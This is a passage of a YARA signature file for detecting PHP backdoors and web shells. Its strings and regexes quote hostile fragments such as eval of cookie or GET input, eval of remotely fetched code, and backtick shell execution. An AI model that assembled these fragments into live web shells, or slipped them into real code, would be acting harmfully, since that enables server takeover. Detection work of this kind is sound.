        $ps0 = "()) : $"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_029 : backdoor
{
    strings:
        $trigger = "= $_COOKIE;"
        $php_backdoor_eval_COOKIE_029_r0 = /\$[\w]+[\s]*=[\s]*\$_COOKIE;[\s]*\(count\(\$[\w]+\)[\s]*==[\s]*[\d]+[^;]+@\$[\w]+\(\)\)[\s]*:[\s]*\$[\w]+;[\s]*/
    condition:
        $trigger and PR01696 and $php_backdoor_eval_COOKIE_029_r0
}

private rule PR01697 : trigger
{
    strings:
        $ps0 = "= $_COOKIE;"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_029_02 : backdoor
{
    strings:
        $trigger = "function [\\w]+\\(\\)[\\s]*\\{[\\s]*(\\$[\\w]+[\\s]*=[^;]+;[\\s]*)?\\$[\\w]+[\\s]*=[\\s]*\\$_COOKIE;"
    condition:
        $trigger and PR01696 and PR01697
}

rule php_backdoor_eval_COOKIE_029_03 : backdoor
{
    strings:
        $trigger = "$is_wp_mobile = ($_SERVER['HTTP_USER_AGENT'] =="
    condition:
        $trigger and PR01696 and PR01697
}

private rule PR01698 : trigger
{
    strings:
        $ps0 = "function __construct()"
    condition:
        $ps0
}

private rule PR01699 : trigger
{
    strings:
        $ps0 = "array('cook', 'set', 'ie');"
    condition:
        $ps0
}

private rule PR01700 : trigger
{
    strings:
        $ps0 = "if(str"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_030 : backdoor
{
    strings:
        $trigger = "array('base', '64_dec', 'ode');"
    condition:
        $trigger and PR01698 and PR01699 and PR01700
}

private rule PR01701 : trigger
{
    strings:
        $ps0 = "]); die;}"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_031 : backdoor
{
    strings:
        $trigger = "])) {@$_COOKIE["
    condition:
        $trigger and PR01701
}

rule php_backdoor_eval_COOKIE_032 : backdoor
{
    strings:
        $trigger = "class wp_Conn{const conn='eval(base64_decode("
    condition:
        $trigger
}

private rule PR01702 : trigger
{
    strings:
        $ps0 = ")['uri'];include_once($"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_033 : backdoor
{
    strings:
        $trigger = "](function($f)use($"
    condition:
        $trigger and PR01702 and PR01480
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_COOKIE_034 : backdoor
{
    strings:
        $trigger = "};if(isset($"
        $php_backdoor_eval_COOKIE_034_r0 = /\};if\(isset\(\$[\w]+[^\{]+\{\$[\w]+=\$[\w]+\[.[\w]+.\]\.\$[\w]+\[.[^;]+;\$[\w]+[\s]*=[\s]*\$[\w]+\[.[\w]+.\][\s]*\.[\s]*\$[^;]+;[\s]*\$[\w]+[\s]*=[\s]*\$[\w]+\('',[\s]*[\s]*\$/
    condition:
        $trigger and PR01691 and PR01692 and PR01016 and $php_backdoor_eval_COOKIE_034_r0
}

private rule PR01703 : trigger
{
    strings:
        $ps0 = "eval($a);"
    condition:
        $ps0
}

private rule PR01704 : trigger
{
    strings:
        $ps0 = "$_COOKIE[\"4\"];"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_035 : backdoor
{
    strings:
        $trigger = "($_COOKIE[\"1\"] == 123)"
    condition:
        $trigger and PR01703 and PR01422 and PR01704
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_COOKIE_036 : backdoor
{
    strings:
        $trigger = "eval($_COOKIE["
        $php_backdoor_eval_COOKIE_036_r0 = /@?eval\(\$_COOKIE\[.[\w]+.\]\);/
    condition:
        $trigger and $php_backdoor_eval_COOKIE_036_r0
}

rule php_backdoor_eval_COOKIE_038 : backdoor
{
    strings:
        $trigger = "){eval(strrev(base64_decode(strrev($"
    condition:
        $trigger and PR00391
}

private rule PR01705 : trigger
{
    strings:
        $ps0 = "eval(hex2bin($"
    condition:
        $ps0
}

private rule PR01706 : trigger
{
    strings:
        $ps0 = "AES-128-"
    condition:
        $ps0
}

private rule PR01707 : trigger
{
    strings:
        $ps0 = "exit(hex2bin"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_039 : backdoor
{
    strings:
        $trigger = "isset($_COOKIE["
    condition:
        $trigger and PR01705 and PR01706 and PR01707
}

private rule PR01708 : trigger
{
    strings:
        $ps0 = "public function __construct($data = null)"
    condition:
        $ps0
}

private rule PR01709 : trigger
{
    strings:
        $ps0 = "$length !== ord($this->data[5]) || !in_array(gettype($prototype) . $length, $prototype))"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_040 : backdoor
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR01708 and PR01709
}

private rule PR01710 : trigger
{
    strings:
        $ps0 = "file_put_contents("
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_041 : backdoor
{
    strings:
        $trigger = "getenv('HTTP_USER_AGENT'))) =="
    condition:
        $trigger and PR00732 and PR01710 and PR01550
}

rule php_backdoor_eval_COOKIE_042 : backdoor
{
    strings:
        $trigger = "@unserialize(sh_decrypt(base64_decode($"
    condition:
        $trigger and PR01653 and PR00391 and PR01466
}

// MANUAL FIX NECESSARY
private rule PR01711 : trigger
{
    strings:
        $ps0 = "(!self::$"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_043 : backdoor
{
    strings:
        $trigger = "return self::$"
        $php_backdoor_eval_COOKIE_043_r0 = /\$_COOKIE;\s*\(count\(\$\w+\)\s*==\s*\(int\)\s*round\(/
    condition:
        $trigger and PR01711 and PR00391 and $php_backdoor_eval_COOKIE_043_r0
}

rule php_backdoor_eval_COOKIE_044 : backdoor
{
    strings:
        $trigger = ")]))) && @eval($"
    condition:
        $trigger and PR01474 and PR01690
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_COOKIE_045 : backdoor
{
    strings:
        $trigger = "if(isset($_COOKIE[\""
        $php_backdoor_eval_COOKIE_045_r0 = /if\(isset\(\$_COOKIE\[\"[^}\n]+exit;}/
    condition:
        $trigger and $php_backdoor_eval_COOKIE_045_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_COOKIE_048 : backdoor
{
    strings:
        $trigger = "]);$"
        $php_backdoor_eval_COOKIE_048_r0 = /\$[\w]+[\s]*=[\s]*\$_COOKIE;[\s]*\$[\w]+[\s]*=[\s]*\$[\w]+\[[\w]+\];[\s]*if\(\$[\w]+\)[\s]*\{[\s]*(\$[\w]+[\s]*=[\s]*\$[\w]+\(\$[\w]+\[[\w]+\]\);[\s]*)+\$[\w]+[\s]*=[\s]*\$[\w]+\(..,[\s]*\$[\w]+\);[\s]*\$[\w]+\(\);[\s]*\}[\s]*/
    condition:
        $trigger and PR01454 and $php_backdoor_eval_COOKIE_048_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_COOKIE_050 : backdoor
{
    strings:
        $trigger = ".chr"
        $php_backdoor_eval_COOKIE_050_r0 = /;\$\w+=..x73.\.\$\w+\[\d\d\]\.chr\(/
    condition:
        $trigger and $php_backdoor_eval_COOKIE_050_r0
}

private rule PR01712 : trigger
{
    strings:
        $ps0 = ")]))) && @$"
    condition:
        $ps0
}

rule php_backdoor_eval_COOKIE_051 : backdoor
{
    strings:
        $trigger = "&& in_array(gettype($"
    condition:
        $trigger and PR01712 and PR01696 and PR01697
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_file_get_contents_001 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_eval_file_get_contents_001_r0 = /eval\([^)]*file_get_contents[^;]+https?:[^;]+\.(php|txt|js|phtml|html|htm)[^;][\)\s]*;/
    condition:
        $trigger and PR00029 and $php_backdoor_eval_file_get_contents_001_r0
}

rule php_backdoor_eval_file_get_contents_002 : backdoor
{
    strings:
        $trigger = "eval(file_get_contents($_GET["
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_file_get_contents_003 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_eval_file_get_contents_003_r0 = /<\?php\s*\$\w+\s*=\s*file_get_contents\(__FILE__\)\s*;\s*\$\w+\s*=\s*base64_decode\(substr\(\$\w+,\s*-?\d+\)\s*\)\s*;\s*\$\w+\s*=\s*gzuncompress\(\$\w+\)\s*;\s*eval\(\$\w+\)\s*;\s*die\(\)\s*;\s*\?>\s*[a-zA-Z0-9\+\/]+/
    condition:
        $trigger and PR01350 and $php_backdoor_eval_file_get_contents_003_r0
}

private rule PR01713 : trigger
{
    strings:
        $ps0 = "= \"base64_decode\";"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_004 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01350 and PR01713
}

private rule PR01714 : trigger
{
    strings:
        $ps0 = "\\x2F\\x2F\".${\"\\x5F\\x52\\x45\\x51\\x55\\x45\\x53\\x54\"}["
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_005 : backdoor
{
    strings:
        $trigger = "\\x7"
    condition:
        $trigger and PR01714
}

rule php_backdoor_eval_file_get_contents_006 : backdoor
{
    strings:
        $trigger = "foreach (str_split(@file_get_contents('php://input"
    condition:
        $trigger and PR00029
}

private rule PR01715 : trigger
{
    strings:
        $ps0 = "FZM1EqUKAgDv8qP5RYA/oDbC3Z1kC3d3Tr+zF"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_007 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR01715
}

private rule PR01716 : trigger
{
    strings:
        $ps0 = "@chop(base64_decode("
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_008 : backdoor
{
    strings:
        $trigger = ",__FILE__);"
    condition:
        $trigger and PR01398 and PR01716
}

// MANUAL FIX NECESSARY
private rule PR01717 : trigger
{
    strings:
        $ps0 = "eval('?>'.$"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_009 : backdoor
{
    strings:
        $trigger = "file_get_contents"
        $php_backdoor_eval_file_get_contents_009_r0 = /\$[\w]+[\s]*=[\s]*@?file_get_contents\([^;]+\);[\s]*eval\(.\?>.\.\$/
    condition:
        $trigger and PR01717 and $php_backdoor_eval_file_get_contents_009_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_file_get_contents_010 : backdoor
{
    strings:
        $trigger = "eval(file_get_contents('http"
        $php_backdoor_eval_file_get_contents_010_r0 = /if[\s]*\(isset\(\$_GET\[.[\w]+.\]\)\)[\s]*\{[\s]*eval\(file_get_contents\(.https?:\/\/.[\s]*.[\s]*\$_GET\[.[\w]+.\]\)\);[\s]*\}/
    condition:
        $trigger and $php_backdoor_eval_file_get_contents_010_r0
}

private rule PR01718 : trigger
{
    strings:
        $ps0 = "$text_auth->decrypt($str,"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_011 : backdoor
{
    strings:
        $trigger = "$str = @file_get_contents($text_file);"
    condition:
        $trigger and PR01718 and PR00029
}

private rule PR01719 : trigger
{
    strings:
        $ps0 = "file_get_contents(\"php://input"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_012 : backdoor
{
    strings:
        $trigger = "call_user_func(new"
    condition:
        $trigger and PR01350 and PR01719 and PR01590
}

private rule PR01720 : trigger
{
    strings:
        $ps0 = "eval(str_rot13(base64_decode(substr(file_get_contents("
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_013 : backdoor
{
    strings:
        $trigger = "Ly8tLS0tLS0tLS0tLS0tLS0tLUNuZmZqYmVxLS0t"
    condition:
        $trigger and PR00265 and PR01720
}

private rule PR01721 : trigger
{
    strings:
        $ps0 = "$_SERVER['HTTP_X_WORDPRESS_KEY'];"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_014 : backdoor
{
    strings:
        $trigger = "hex2bin($"
    condition:
        $trigger and PR00265 and PR01659 and PR01721
}

rule php_backdoor_eval_file_get_contents_015 : backdoor
{
    strings:
        $trigger = "$filedata = file_get_contents('https://gist.githubusercontent.com/"
    condition:
        $trigger and PR00029
}

private rule PR01722 : trigger
{
    strings:
        $ps0 = "urldecode(base64_decode($"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_016 : backdoor
{
    strings:
        $trigger = "://'.@$_GET["
    condition:
        $trigger and PR00029 and PR01722 and PR01431
}

private rule PR01723 : trigger
{
    strings:
        $ps0 = "128/2"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_017 : backdoor
{
    strings:
        $trigger = "eval(\"?>\"."
    condition:
        $trigger and PR01431 and PR01723
}

rule php_backdoor_eval_file_get_contents_018 : backdoor
{
    strings:
        $trigger = "eval(\"?>\".@file_get_contents("
    condition:
        $trigger
}

rule php_backdoor_eval_file_get_contents_019 : backdoor
{
    strings:
        $trigger = "<?=eval(\"?>\".file_get_contents(\"https://bit.ly/"
    condition:
        $trigger
}

private rule PR01724 : trigger
{
    strings:
        $ps0 = "(\"?>\".file_get_contents"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_020 : backdoor
{
    strings:
        $trigger = "eval/*"
    condition:
        $trigger and PR01724
}

private rule PR01725 : trigger
{
    strings:
        $ps0 = "?>\".file_get_contents(\"http"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_021 : backdoor
{
    strings:
        $trigger = "eval(\"?>\"."
    condition:
        $trigger and PR01725
}

private rule PR01726 : trigger
{
    strings:
        $ps0 = "exec($"
    condition:
        $ps0
}

private rule PR01727 : trigger
{
    strings:
        $ps0 = "eval(\"?>\".$"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_022 : backdoor
{
    strings:
        $trigger = "http_build_query($"
    condition:
        $trigger and PR01726 and PR00046 and PR01330 and PR01727
}

rule php_backdoor_eval_file_get_contents_023 : backdoor
{
    strings:
        $trigger = "$payload=encode($_SESSION[$payloadName],$key);"
    condition:
        $trigger and PR01350
}

private rule PR01728 : trigger
{
    strings:
        $ps0 = "\\x69\\x6d\\x70\\x6c\\x6f\\x64\\x65"
    condition:
        $ps0
}

private rule PR01729 : trigger
{
    strings:
        $ps0 = "\\x67\\172\\151\\156\\146\\x6c\\x61\\x74\\145"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_024 : backdoor
{
    strings:
        $trigger = "\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65"
    condition:
        $trigger and PR01611 and PR01613 and PR01614 and PR01728 and PR01729
}

private rule PR01730 : trigger
{
    strings:
        $ps0 = "eval (\"?>$"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_025 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01730
}

rule php_backdoor_eval_file_get_contents_027 : backdoor
{
    strings:
        $trigger = "eval(\"\\77\\76\".file_get_contents("
    condition:
        $trigger
}

private rule PR01731 : trigger
{
    strings:
        $ps0 = "=file_get_contents(\"http"
    condition:
        $ps0
}

private rule PR01732 : trigger
{
    strings:
        $ps0 = "<?=$"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_029 : backdoor
{
    strings:
        $trigger = "=$eval;"
    condition:
        $trigger and PR01731 and PR01732
}

private rule PR01733 : trigger
{
    strings:
        $ps0 = "'?>';"
    condition:
        $ps0
}

rule php_backdoor_eval_file_get_contents_030 : backdoor
{
    strings:
        $trigger = "'http://';"
    condition:
        $trigger and PR00029 and PR01722 and PR01733 and PR01431
}

private rule PR01734 : trigger
{
    strings:
        $ps0 = "txt\");if($_GET"
    condition:
        $ps0
}

private rule PR01735 : trigger
{
    strings:
        $ps0 = ");exit;}"
    condition:
        $ps0
}

private rule PR01736 : trigger
{
    strings:
        $ps0 = "\"){eval($"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_008 : backdoor
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01734 and PR01735 and PR01736
}

private rule PR01737 : trigger
{
    strings:
        $ps0 = "= 'b"
    condition:
        $ps0
}

private rule PR01738 : trigger
{
    strings:
        $ps0 = "unset($"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_009 : backdoor
{
    strings:
        $trigger = "' . '"
    condition:
        $trigger and PR01737 and PR01480 and PR01738 and PR01562 and PR01392 and PR01410
}

rule php_backdoor_eval_gen_010 : backdoor
{
    strings:
        $trigger = "eval(base64_decode('LyogNDUzNTQ2Nj"
    condition:
        $trigger
}

rule php_backdoor_eval_gen_011 : backdoor
{
    strings:
        $trigger = "eval(pack(\"H*"
    condition:
        $trigger
}

rule php_backdoor_eval_gen_012 : backdoor
{
    strings:
        $trigger = "eval(@$_GET["
    condition:
        $trigger
}

rule php_backdoor_eval_gen_013 : backdoor
{
    strings:
        $trigger = "if (file_put_contents($path, GetPayload($payload)) != FALSE)"
    condition:
        $trigger
}

rule php_backdoor_eval_gen_014 : backdoor
{
    strings:
        $trigger = "eval(gzinflate($adel("
    condition:
        $trigger
}

private rule PR01739 : trigger
{
    strings:
        $ps0 = "DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc2V0KCdlc"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_015 : backdoor
{
    strings:
        $trigger = "\";eval("
    condition:
        $trigger and PR01739
}

private rule PR01740 : trigger
{
    strings:
        $ps0 = "implode('_',$"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_016 : backdoor
{
    strings:
        $trigger = "return eval($"
    condition:
        $trigger and PR01740
}

rule php_backdoor_eval_gen_017 : backdoor
{
    strings:
        $trigger = "eval(\"\\x65\\x76\\x61\\x6c\\x28\\x67\\x7a\\x69\\x6e\\x66\\x6c\\x61\\x74\\x65\\x28\\x73\\x74\\x72\\x5f\\x72\\x6f\\x74\\x31\\x33\\x2"
    condition:
        $trigger
}

private rule PR01741 : trigger
{
    strings:
        $ps0 = "@set_time_limit("
    condition:
        $ps0
}

private rule PR01742 : trigger
{
    strings:
        $ps0 = "rror_"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_018 : backdoor
{
    strings:
        $trigger = "eval(gzinflate(base64_decode("
    condition:
        $trigger and PR01741 and PR01742
}

rule php_backdoor_eval_gen_019 : backdoor
{
    strings:
        $trigger = "@eval(base64_decode(\"LyoqDQogKiBTaWduYXR1cmUgRm9yIFJlcG9ydA0KICovJHgxMD0n"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR01743 : trigger
{
    strings:
        $ps0 = "$url.=$"
    condition:
        $ps0
}

private rule PR01744 : trigger
{
    strings:
        $ps0 = "$get.=chr("
    condition:
        $ps0
}

rule php_backdoor_eval_gen_022 : backdoor
{
    strings:
        $trigger = "if(empty($_SESSION["
        $php_backdoor_eval_gen_022_r0 = /\.\s*chr\(\d+\)\s*\./
    condition:
        $trigger and PR01410 and PR01743 and PR01744 and $php_backdoor_eval_gen_022_r0
}

rule php_backdoor_eval_gen_023 : backdoor
{
    strings:
        $trigger = "@eval(base64_decode($_SERVER['HTTP_"
    condition:
        $trigger
}

private rule PR01745 : trigger
{
    strings:
        $ps0 = "aWYoIWRlZmluZWQoImNoYWVKb3U3IikpewogICAgZGVmaW5lKCJjaGFlSm9"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_024 : backdoor
{
    strings:
        $trigger = "eval(base64_decode"
    condition:
        $trigger and PR01745
}

private rule PR01746 : trigger
{
    strings:
        $ps0 = "exit"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_025 : backdoor
{
    strings:
        $trigger = "$x(\"PD9waHAgJHsi"
    condition:
        $trigger and PR01746
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_gen_026 : backdoor
{
    strings:
        $trigger = "ZWNobyAnaXpvY2luPGJyPi"
        $php_backdoor_eval_gen_026_r0 = /[bB][aA][sS][eE]64_[dD][eE][cC][oO][dD][eE]\(/
    condition:
        $trigger and PR00029 and $php_backdoor_eval_gen_026_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_gen_028 : backdoor
{
    strings:
        $trigger = "(hex2bin("
        $php_backdoor_eval_gen_028_r0 = /function[\s]*_[\w]+\(\$_[\w]+\)\{\$_[\w]+[^\{]+\{global[\s]*\$_[\w]+;global[^\}]+\)\);\}eval\(eval\([^;]+\)\)\)\);/
    condition:
        $trigger and PR00029 and PR01422 and $php_backdoor_eval_gen_028_r0
}

private rule PR01747 : trigger
{
    strings:
        $ps0 = "FZTXtaNAAEP/3QXGgA"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_029 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR01747
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_gen_030 : backdoor
{
    strings:
        $trigger = "eval((string) base64_decode($_COOKIE['"
        $php_backdoor_eval_gen_030_r0 = /[bB][aA][sS][eE]64_[dD][eE][cC][oO][dD][eE]\(/
    condition:
        $trigger and $php_backdoor_eval_gen_030_r0
}

private rule PR01748 : trigger
{
    strings:
        $ps0 = "$key"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_031 : backdoor
{
    strings:
        $trigger = "$strq = $code_auth->uncode($"
    condition:
        $trigger and PR00029 and PR01422 and PR01748
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_gen_032 : backdoor
{
    strings:
        $trigger = "DQpjbGFzcyAgVGVzdHsN"
        $php_backdoor_eval_gen_032_r0 = /[bB][aA][sS][eE]64_[dD][eE][cC][oO][dD][eE]\(/
    condition:
        $trigger and PR00029 and $php_backdoor_eval_gen_032_r0
}

// MANUAL FIX NECESSARY
private rule PR01749 : trigger
{
    strings:
        $ps0 = "PD8NCiRhID0gZmlsZV9nZXRfY29"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_033 : backdoor
{
    strings:
        $trigger = "eva"
        $php_backdoor_eval_gen_033_r0 = /<\?php[\s]*@?eval/
    condition:
        $trigger and PR01749 and $php_backdoor_eval_gen_033_r0
}

private rule PR01750 : trigger
{
    strings:
        $ps0 = ";print_r(openssl_get_cipher_methods());}echo"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_034 : backdoor
{
    strings:
        $trigger = "rror_"
    condition:
        $trigger and PR01741 and PR00029 and PR01750 and PR01422
}

private rule PR01751 : trigger
{
    strings:
        $ps0 = "T9tGFC92IiF8i2JKSVeSgBCooErVLH9Jp"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_035 : backdoor
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR01751
}

private rule PR01752 : trigger
{
    strings:
        $ps0 = "function __construct(){"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_036 : backdoor
{
    strings:
        $trigger = "@eval($this->"
    condition:
        $trigger and PR01752
}

private rule PR01753 : trigger
{
    strings:
        $ps0 = ">getRequest()->getParam("
    condition:
        $ps0
}

rule php_backdoor_eval_gen_037 : backdoor
{
    strings:
        $trigger = "!= \"\") eval(base64_decode($"
    condition:
        $trigger and PR01753
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_gen_038 : backdoor
{
    strings:
        $trigger = "isset"
        $php_backdoor_eval_gen_038_w0 = "@author Jakub Vrana"
        $php_backdoor_eval_gen_038_r1 = /if[^)]+isset\(\$_(COOKIE|POST|GET)\[[^\]]+\]\)\)[^\n]+(COOKIE|POST|GET)\[[^\]]+\]\(\$_(COOKIE|POST|GET)\[[^\]]+\]\);([^\n]*\})*/
    condition:
        $trigger and PR01678 and not $php_backdoor_eval_gen_038_w0 and $php_backdoor_eval_gen_038_r1
}

private rule PR01754 : trigger
{
    strings:
        $ps0 = "ZXZhbCgnPz4nLi"
    condition:
        $ps0
}

private rule PR01755 : trigger
{
    strings:
        $ps0 = "<?php define("
    condition:
        $ps0
}

private rule PR01756 : trigger
{
    strings:
        $ps0 = "];eval($"
    condition:
        $ps0
}

private rule PR01757 : trigger
{
    strings:
        $ps0 = ",__FILE__);$"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_040 : backdoor
{
    strings:
        $trigger = "\"));?>"
    condition:
        $trigger and PR01754 and PR01755 and PR01756 and PR01422 and PR01757
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_gen_041 : backdoor
{
    strings:
        $trigger = "eva"
        $php_backdoor_eval_gen_041_r0 = /\$[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]+\s*=\s*array.(.{26},){50}[^;]+;/
    condition:
        $trigger and $php_backdoor_eval_gen_041_r0
}

private rule PR01758 : trigger
{
    strings:
        $ps0 = "($_"
    condition:
        $ps0
}

private rule PR01759 : trigger
{
    strings:
        $ps0 = "(base64_decode($"
    condition:
        $ps0
}

private rule PR01760 : trigger
{
    strings:
        $ps0 = "implode("
    condition:
        $ps0
}

private rule PR01761 : trigger
{
    strings:
        $ps0 = "array_walk($"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_042 : backdoor
{
    strings:
        $trigger = "preg_split("
    condition:
        $trigger and PR01758 and PR01759 and PR01760 and PR01350 and PR01761
}

private rule PR01762 : trigger
{
    strings:
        $ps0 = "])); } } return $"
    condition:
        $ps0
}

private rule PR01763 : trigger
{
    strings:
        $ps0 = "(isset($_"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_043 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01762 and PR01763 and PR01550
}

// MANUAL FIX NECESSARY
private rule PR01764 : trigger
{
    strings:
        $ps0 = "[0].$"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_048 : backdoor
{
    strings:
        $trigger = "eval(${$"
        $php_backdoor_eval_gen_048_r0 = /;if\(isset\(\$\{\$\w+\[\d+\]\.\$\w+\[\d+\]\.\$\w+\[\d+\]/
    condition:
        $trigger and PR01764 and $php_backdoor_eval_gen_048_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_gen_049 : backdoor
{
    strings:
        $trigger = "*/"
        $php_backdoor_eval_gen_049_r0 = /\^['\"]/
        $php_backdoor_eval_gen_049_r1 = /\$[\w]+\^\/\*[^\x02]{4000}[^\x02]+\.\/\*/
    condition:
        $trigger and $php_backdoor_eval_gen_049_r0 and $php_backdoor_eval_gen_049_r1
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_gen_052 : backdoor
{
    strings:
        $trigger = "eva"
        $php_backdoor_eval_gen_052_r0 = /';eval\((\$\w+\.){10,}(\$\w+)\);return \$\w+;\}/
    condition:
        $trigger and $php_backdoor_eval_gen_052_r0
}

// MANUAL FIX NECESSARY
rule php_backdoor_eval_gen_053 : backdoor
{
    strings:
        $trigger = "base64_decode"
        $php_backdoor_eval_gen_053_r0 = /\@\$\w+\([\"'eval\s\.]+\(.eval\(gzinflate\(base64_decode\(\$/
    condition:
        $trigger and PR00029 and $php_backdoor_eval_gen_053_r0
}

// MANUAL FIX NECESSARY
private rule PR01765 : trigger
{
    strings:
        $ps0 = "strrev"
    condition:
        $ps0
}

rule php_backdoor_eval_gen_054 : backdoor
{
    strings:
        $trigger = "(implode("
        $php_backdoor_eval_gen_054_r0 = /(\$\w+\s*=\s*strrev\(['\"\._\w]+\);){2}eval\(/
    condition:
        $trigger and PR00029 and PR01765 and $php_backdoor_eval_gen_054_r0
}

rule php_backdoor_eval_gen_055 : backdoor
{
    strings:
        $trigger = "\\147\\172\\165\\156"
    condition:
        $trigger and PR00029 and PR01450
}

// MANUAL FIX NECESSARY
private rule PR01766 : trigger
{
    strings:
        $ps0 = "eval($_GET["
    condition:
        $ps0
}

rule php_backdoor_eval_GET_001 : backdoor
{
    strings:
        $trigger = "isset"
        $php_backdoor_eval_GET_001_r0 = /if[\s]*\([\s]*isset[\s]*\([\s]*\$_GET[^\]]+\][\s\)]+\{[\s]*eval[\s]*\([\s]*\$_GET\[[^\)]+\);[\s]*(die[^;]*;[\s]*)?\}/
    condition:
        $trigger and PR01766 and $php_backdoor_eval_GET_001_r0
}

rule php_backdoor_eval_GET_002 : backdoor
{
    strings:
        $trigger = ")].self::$_PADCHAR);break;}return implode(\"\",$"
    condition:
        $trigger and PR01396
}

rule php_backdoor_eval_GET_004 : backdoor
{
    strings:
        $trigger = "RETURNTRANSFER, 1);$result = curl_exec($ch);eval('?>'.$result);"
    condition:
        $trigger
}

private rule PR01767 : trigger
{
    strings:
        $ps0 = "]) ?>"
    condition:
        $ps0
}

rule php_backdoor_eval_GET_005 : backdoor
{
    strings:
        $trigger = "<?php $_GET["
    condition:
        $trigger and PR01767
}

rule php_backdoor_eval_GET_006 : backdoor
{
    strings:
        $trigger = "&& false !== stripos($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip') && ( $file = get_file($basepath ."
    condition:
        $trigger and PR00029 and PR00265
}

private rule PR01768 : trigger
{
    strings:
        $ps0 = "$file=implode(\"\\n\",file($_GET["
    condition:
        $ps0
}

rule php_backdoor_eval_GET_007 : backdoor
{
    strings:
        $trigger = "str_replace(\"<?php\", \"\",$file);"
    condition:
        $trigger and PR01350 and PR01768
}

private rule PR01769 : trigger
{
    strings:
        $ps0 = "<?=`$_`; ?>"
    condition:
        $ps0
}

rule php_backdoor_eval_GET_008 : backdoor
{
    strings:
        $trigger = "$_ = range(\"A\",\"Z\");"
    condition:
        $trigger and PR01769 and PR01016
}

private rule PR01770 : trigger
{
    strings:
        $ps0 = "ZXZhbChiYXNlNjRfZGVjb2RlKCRhbm9ucG"
    condition:
        $ps0
}

rule php_backdoor_eval_GET_009 : backdoor
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01398 and PR01770
}

rule php_backdoor_eval_GET_010 : backdoor
{
    strings:
        $trigger = "=`$_GET[0]`"
    condition:
        $trigger
}

private rule PR01771 : trigger
{
    strings:
        $ps0 = "strrev('etalfnizg');"
    condition:
        $ps0
}

private rule PR01772 : trigger
{
    strings:
        $ps0 = "strrev('edoced_46esab');"
    condition:
        $ps0
}

